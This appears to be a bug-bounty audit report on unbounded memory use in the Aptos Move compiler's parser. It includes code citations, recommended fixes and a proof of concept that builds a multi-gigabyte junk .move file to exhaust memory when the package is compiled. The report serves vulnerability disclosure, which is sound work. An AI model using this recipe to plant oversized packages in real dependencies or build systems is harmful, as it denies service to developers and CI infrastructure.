# Audit Report

## Title
Unbounded Memory Consumption in Move Package Compilation via Large Source Files

## Summary
The Move compiler's file parser reads entire source files into memory without size limits, allowing an attacker to craft malicious Move packages with extremely large source files that cause memory exhaustion and denial of service when compiled.

## Finding Description

The Move CLI's `execute()` function in `build.rs` calls `compile_package()`, which eventually invokes the parser to read Move source files. [1](#0-0) 

The compilation flow proceeds through several layers: `BuildConfig::compile_package()` [2](#0-1)  calls `BuildPlan::compile()` [3](#0-2) , which triggers the compilation driver [4](#0-3) .

The vulnerability exists in the parser's file reading logic, where the entire source file is unconditionally loaded into memory: [5](#0-4) 

An attacker can exploit this by:
1. Creating a malicious Move package with a multi-gigabyte `.move` source file (e.g., 10GB of comments or whitespace)
2. Distributing this package via git dependencies or social engineering
3. When a victim runs `aptos move build` or `move build`, the parser attempts to read the entire file into a `String` buffer
4. This causes memory exhaustion, triggering OOM kills or system slowdowns

The Move compiler lacks resource limits present in other parts of the system. While the bytecode verifier enforces type depth and node count limits [6](#0-5) , these limits apply only after parsing completes. The compiler's `Options` struct contains no timeout, memory limit, or file size constraints [7](#0-6) .

## Impact Explanation

This vulnerability is rated **Medium Severity** per Aptos bug bounty criteria for the following reasons:

**Primary Impact:**
- **Developer Infrastructure DoS**: Malicious packages can render development machines unusable, disrupting the ecosystem
- **CI/CD Pipeline DoS**: Automated build systems processing untrusted packages face availability loss
- **Validator Infrastructure Risk**: If validators compile untested code (e.g., for governance proposals or framework upgrades), their infrastructure could be compromised

**Why Not Higher Severity:**
- Does not directly affect consensus safety or liveness of the running blockchain
- Does not enable theft or minting of funds
- Does not cause permanent state corruption
- Requires victim to actively compile malicious code (social engineering component)

**Why Not Lower Severity:**
- Breaks the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits"
- Can affect validator operations if they compile packages
- Trivial to exploit once malicious package is distributed
- No recovery mechanism short of killing the process

## Likelihood Explanation

**High Likelihood** of exploitation due to:

1. **Trivial Attack Complexity**: Creating a large file requires minimal effort (e.g., `dd if=/dev/zero of=attack.move bs=1G count=10`)
2. **Common Attack Vector**: Dependency confusion and malicious package distribution are well-known attack patterns
3. **Wide Attack Surface**: Any developer or CI system that compiles Move packages is vulnerable
4. **No Authentication Required**: Attacker needs no special privileges or validator access
5. **Silent Failure Mode**: The victim may not realize the package is malicious until compilation begins

The attack is realistic because:
- Move packages commonly include git dependencies that are automatically fetched
- Developers regularly compile third-party code during integration
- No warning is provided about large source files
- The ecosystem encourages code sharing and package reuse

## Recommendation

Implement multiple layers of defense:

**1. File Size Limits** (Primary Fix):
```rust
// In third_party/move/move-compiler-v2/legacy-move-compiler/src/parser/mod.rs
const MAX_SOURCE_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10 MB limit

fn parse_file(
    compilation_env: &mut CompilationEnv,
    files: &mut FilesSourceText,
    fname: Symbol,
) -> anyhow::Result<...> {
    let mut diags = Diagnostics::new();
    let mut f = File::open(fname.as_str())?;
    
    // Check file size before reading
    let metadata = f.metadata()?;
    if metadata.len() > MAX_SOURCE_FILE_SIZE {
        return Err(anyhow::anyhow!(
            "Source file '{}' exceeds maximum size of {} bytes (actual: {} bytes)",
            fname, MAX_SOURCE_FILE_SIZE, metadata.len()
        ));
    }
    
    let mut source_buffer = String::new();
    f.read_to_string(&mut source_buffer)?;
    // ... rest of function
}
```

**2. Compilation Timeout**:
Add timeout support to `Options`:
```rust
// In third_party/move/move-compiler-v2/src/options.rs
pub struct Options {
    // ... existing fields ...
    
    /// Maximum compilation time in seconds (0 = no limit)
    #[clap(long, default_value = "300")]
    pub compilation_timeout_secs: u64,
}
```

**3. Total Package Size Limit**:
Validate total package size before compilation begins in `BuildConfig::compile_package()`.

**4. Memory Usage Monitoring**:
Consider using Rust's memory allocator hooks to detect excessive allocations during compilation.

## Proof of Concept

**Step 1: Create malicious package**
```bash
# Create package directory
mkdir malicious_package
cd malicious_package

# Create Move.toml
cat > Move.toml << EOF
[package]
name = "MaliciousPackage"
version = "0.0.1"

[addresses]
std = "0x1"

[dependencies.AptosFramework]
git = "https://github.com/aptos-labs/aptos-core.git"
rev = "main"
subdir = "aptos-move/framework/aptos-framework"
EOF

# Create sources directory
mkdir -p sources

# Create 5GB source file filled with comments
dd if=/dev/zero bs=1M count=5120 | tr '\0' '#' > sources/attack.move
echo "module 0x1::Attack { }" >> sources/attack.move
```

**Step 2: Trigger vulnerability**
```bash
# Attempt to build - this will exhaust memory
aptos move compile --package-dir .

# Expected result: Process killed by OOM or extreme memory consumption
# Monitor with: watch -n 1 'ps aux | grep move'
```

**Step 3: Verify memory consumption**
```bash
# Monitor memory usage during compilation
/usr/bin/time -v aptos move compile --package-dir . 2>&1 | grep "Maximum resident"

# Expected: Several gigabytes of memory allocated before OOM/crash
```

**Alternative PoC using Rust test**:
```rust
#[test]
#[ignore] // Ignore by default to prevent CI failures
fn test_large_file_dos() {
    use std::fs::File;
    use std::io::Write;
    use tempfile::TempDir;
    
    let temp_dir = TempDir::new().unwrap();
    let source_file = temp_dir.path().join("large.move");
    
    // Create 1GB file
    let mut f = File::create(&source_file).unwrap();
    let large_comment = vec![b'#'; 1024 * 1024]; // 1 MB
    for _ in 0..1024 {
        f.write_all(&large_comment).unwrap(); // Write 1 GB total
    }
    f.write_all(b"\nmodule 0x1::Test {}").unwrap();
    
    // Attempt to compile - should fail with resource exhaustion
    let result = std::panic::catch_unwind(|| {
        // Call parser directly
        parse_file(/* ... */);
    });
    
    assert!(result.is_err(), "Should fail due to resource exhaustion");
}
```

### Citations

**File:** third_party/move/tools/move-cli/src/base/build.rs (L15-27)
```rust
    pub fn execute(self, path: Option<PathBuf>, config: BuildConfig) -> anyhow::Result<()> {
        let rerooted_path = reroot_path(path)?;
        if config.fetch_deps_only {
            let mut config = config;
            if config.test_mode {
                config.dev_mode = true;
            }
            config.download_deps_for_package(&rerooted_path, &mut std::io::stdout())?;
            return Ok(());
        }
        config.compile_package(&rerooted_path, &mut std::io::stdout())?;
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/lib.rs (L145-152)
```rust
    pub fn compile_package<W: Write>(self, path: &Path, writer: &mut W) -> Result<CompiledPackage> {
        let config = self.compiler_config.clone(); // Need clone because of mut self
        let resolved_graph = self.resolution_graph_for_package(path, writer)?;
        let mutx = PackageLock::lock();
        let ret = BuildPlan::create(resolved_graph)?.compile(&config, writer);
        mutx.unlock();
        ret
    }
```

**File:** third_party/move/tools/move-package/src/compilation/build_plan.rs (L60-67)
```rust
    pub fn compile<W: Write>(
        &self,
        config: &CompilerConfig,
        writer: &mut W,
    ) -> Result<CompiledPackage> {
        self.compile_with_driver(writer, config, vec![], build_and_report_v2_driver)
            .map(|(package, _)| package)
    }
```

**File:** third_party/move/tools/move-package/src/compilation/compiled_package.rs (L1089-1098)
```rust
pub fn build_and_report_v2_driver(options: move_compiler_v2::Options) -> CompilerDriverResult {
    let mut writer = options.error_writer();
    let mut emitter = options.error_emitter(&mut writer);
    match move_compiler_v2::run_move_compiler(emitter.as_mut(), options) {
        Ok((env, units)) => Ok((move_compiler_v2::make_files_source_text(&env), units, env)),
        Err(_) => {
            // Error reported, exit
            std::process::exit(1);
        },
    }
```

**File:** third_party/move/move-compiler-v2/legacy-move-compiler/src/parser/mod.rs (L177-181)
```rust
    let mut diags = Diagnostics::new();
    let mut f = File::open(fname.as_str())
        .map_err(|err| std::io::Error::new(err.kind(), format!("{}: {}", err, fname)))?;
    let mut source_buffer = String::new();
    f.read_to_string(&mut source_buffer)?;
```

**File:** third_party/move/move-bytecode-verifier/src/limits.rs (L1-50)
```rust
// Copyright (c) The Move Contributors
// SPDX-License-Identifier: Apache-2.0

use crate::VerifierConfig;
use move_binary_format::{
    binary_views::BinaryIndexedView,
    errors::{Location, PartialVMError, PartialVMResult, VMResult},
    file_format::{CompiledModule, CompiledScript, SignatureToken, StructFieldInformation},
    IndexKind,
};
use move_core_types::vm_status::StatusCode;
use std::cmp;

pub struct LimitsVerifier<'a> {
    resolver: BinaryIndexedView<'a>,
}

impl<'a> LimitsVerifier<'a> {
    pub fn verify_module(config: &VerifierConfig, module: &'a CompiledModule) -> VMResult<()> {
        Self::verify_module_impl(config, module)
            .map_err(|e| e.finish(Location::Module(module.self_id())))
    }

    fn verify_module_impl(
        config: &VerifierConfig,
        module: &'a CompiledModule,
    ) -> PartialVMResult<()> {
        let limit_check = Self {
            resolver: BinaryIndexedView::Module(module),
        };
        limit_check.verify_function_handles(config)?;
        limit_check.verify_struct_handles(config)?;
        limit_check.verify_type_nodes(config)?;
        limit_check.verify_definitions(config)
    }

    pub fn verify_script(config: &VerifierConfig, module: &'a CompiledScript) -> VMResult<()> {
        Self::verify_script_impl(config, module).map_err(|e| e.finish(Location::Script))
    }

    fn verify_script_impl(
        config: &VerifierConfig,
        script: &'a CompiledScript,
    ) -> PartialVMResult<()> {
        let limit_check = Self {
            resolver: BinaryIndexedView::Script(script),
        };
        limit_check.verify_function_handles(config)?;
        limit_check.verify_struct_handles(config)?;
        limit_check.verify_type_nodes(config)
```

**File:** third_party/move/move-compiler-v2/src/options.rs (L28-136)
```rust
/// Defines options for a run of the compiler.
#[derive(Parser, Clone, Debug)]
#[clap(author, version, about)]
pub struct Options {
    /// Directories where to lookup (already compiled) dependencies.
    #[clap(
        short,
        num_args = 0..
    )]
    pub dependencies: Vec<String>,

    /// Named address mapping.
    #[clap(
        short,
        num_args = 0..
    )]
    pub named_address_mapping: Vec<String>,

    /// Output directory.
    #[clap(short, long, default_value = "")]
    pub output_dir: String,

    /// The language version to use.
    #[clap(long, value_parser = clap::value_parser!(LanguageVersion))]
    pub language_version: Option<LanguageVersion>,

    /// The compiler version to use.
    #[clap(long, value_parser = clap::value_parser!(CompilerVersion))]
    pub compiler_version: Option<CompilerVersion>,

    /// Do not complain about unknown attributes in Move code.
    #[clap(long, default_value = "false")]
    pub skip_attribute_checks: bool,

    /// Known attributes for this dialect of move; if empty, assumes third-party Move.
    /// Only used if skip_attribute_checks is false.
    #[clap(skip)]
    pub known_attributes: BTreeSet<String>,

    /// Whether we generate code for tests. This specifically guarantees stable output
    /// for baseline testing.
    #[clap(long)]
    pub testing: bool,

    /// Active experiments. Experiments alter default behavior of the compiler.
    /// Each element is `name[=on/off]` to enable/disable experiment `name`.
    /// See `Experiment` struct.
    #[clap(short, hide(true))]
    #[clap(
        long = "experiment",
        num_args = 0..
    )]
    pub experiments: Vec<String>,

    /// A transient cache for memoization of experiment checks.
    #[clap(skip)]
    pub experiment_cache: RefCell<BTreeMap<String, bool>>,

    /// Sources to compile (positional arg, therefore last).
    /// Each source should be a path to either (1) a Move file or (2) a directory containing Move
    /// files, all to be compiled (e.g., not the root directory of a package---which contains
    /// Move.toml---but a specific subdirectory such as `sources`, `scripts`, and/or `tests`,
    /// depending on compilation mode).
    pub sources: Vec<String>,

    /// Dependencies to compile but not treat as a test/docgen/warning/prover target.
    /// Each source_dep should be a path to either (1) a Move file or (2) a directory containing
    /// Move files, all to be compiled (e.g., not the root directory of a package---which contains
    /// Move.toml---but a specific subdirectory such as `sources`).
    #[clap(skip)]
    pub sources_deps: Vec<String>,

    /// Warn about use of deprecated functions, modules, etc.
    #[clap(long = cli::MOVE_COMPILER_WARN_OF_DEPRECATION_USE_FLAG,
           default_value=bool_to_str(move_compiler_warn_of_deprecation_use_env_var()))]
    pub warn_deprecated: bool,

    /// Show warnings about use of deprecated usage in the Aptos libraries,
    /// which we should generally not bother users with.
    /// Note that current value of this constant is "Wdeprecation-aptos"
    #[clap(hide(true), long = cli::WARN_OF_DEPRECATION_USE_IN_APTOS_LIBS_FLAG,
           default_value=bool_to_str(warn_of_deprecation_use_in_aptos_libs_env_var()))]
    pub warn_of_deprecation_use_in_aptos_libs: bool,

    /// Show warnings about unused functions, fields, constants, etc.
    /// Note that the current value of this constant is "Wunused"
    #[clap(long = cli::WARN_UNUSED_FLAG, default_value="false")]
    pub warn_unused: bool,

    /// Whether to compile everything, including dependencies.
    #[clap(long)]
    pub whole_program: bool,

    /// Whether to compile #[test] and #[test_only] code
    #[clap(skip)]
    pub compile_test_code: bool,

    /// Whether to compile #[verify_only] code
    #[clap(skip)]
    pub compile_verify_code: bool,

    /// External checks to be performed.
    #[clap(skip)]
    pub external_checks: Vec<Arc<dyn ExternalChecks>>,

    /// Whether to print errors to stderr as they are reported.
    #[clap(long, default_value = "true")]
    pub print_errors: bool,
}
```
